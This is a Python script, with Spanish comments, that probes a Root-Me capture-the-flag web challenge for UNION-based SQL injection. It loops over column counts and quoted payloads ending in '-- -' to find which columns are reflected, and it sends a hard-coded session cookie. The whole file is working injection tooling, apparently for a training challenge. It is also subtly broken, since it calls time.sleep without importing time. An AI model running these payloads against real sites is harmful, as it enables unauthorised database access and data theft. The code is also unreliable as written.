import requests
import re

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

def test_union_with_numbers():
    """Prueba UNION SELECT buscando números inyectados"""
    print("="*70)
    print("  BUSCANDO NÚMEROS INYECTADOS EN RESPUESTA")
    print("="*70)
    
    # Baseline
    params = {"action": "member", "member": "1"}
    r = requests.get(URL, params=params, cookies=COOKIE)
    baseline = r.text
    print(f"Baseline: {len(baseline)} bytes")
    
    # Probar diferentes números de columnas con números únicos
    for cols in range(1, 20):
        # Crear números únicos para cada columna
        numbers = [str(i + 100) for i in range(cols)]  # 100, 101, 102, ...
        payload = f"1 UNION SELECT {','.join(numbers)}"
        params = {"action": "member", "member": payload}
        r = requests.get(URL, params=params, cookies=COOKIE)
        content = r.text
        
        # Buscar si algún número inyectado aparece en la respuesta
        found = False
        for num in numbers:
            if num in content and num not in baseline:
                print(f"[+] ¡Número {num} encontrado en la respuesta!")
                print(f"    Columnas: {cols}")
                print(f"    Contenido: {content[:500]}...")
                found = True
                break
        
        if found:
            break
        else:
            print(f"[-] {cols} columnas: No se encontraron números")
        time.sleep(0.3)
    
    # Probar con diferentes posiciones de inyección
    print("\n[Probando diferentes posiciones de inyección]")
    positions = [
        "1 UNION SELECT 100,101,102,103,104,105,106,107,108,109",
        "1 UNION SELECT 100,101,102,103,104,105,106,107,108,109,110",
        "1 UNION SELECT 100,101,102,103,104,105,106,107,108,109,110,111",
        "1' UNION SELECT 100,101,102,103,104,105-- -",
        "1' UNION SELECT 100,101,102,103,104,105,106-- -",
    ]
    
    for payload in positions:
        params = {"action": "member", "member": payload}
        r = requests.get(URL, params=params, cookies=COOKIE)
        content = r.text
        
        # Buscar números
        numbers = re.findall(r'\b(100|101|102|103|104|105|106|107|108|109|110|111)\b', content)
        if numbers:
            print(f"[+] ¡Números encontrados! {payload[:40]}")
            print(f"    Números: {numbers}")
            print(f"    Contenido: {content[:300]}...")
            break
        else:
            print(f"[-] No se encontraron números: {payload[:40]}")
        time.sleep(0.3)

test_union_with_numbers()
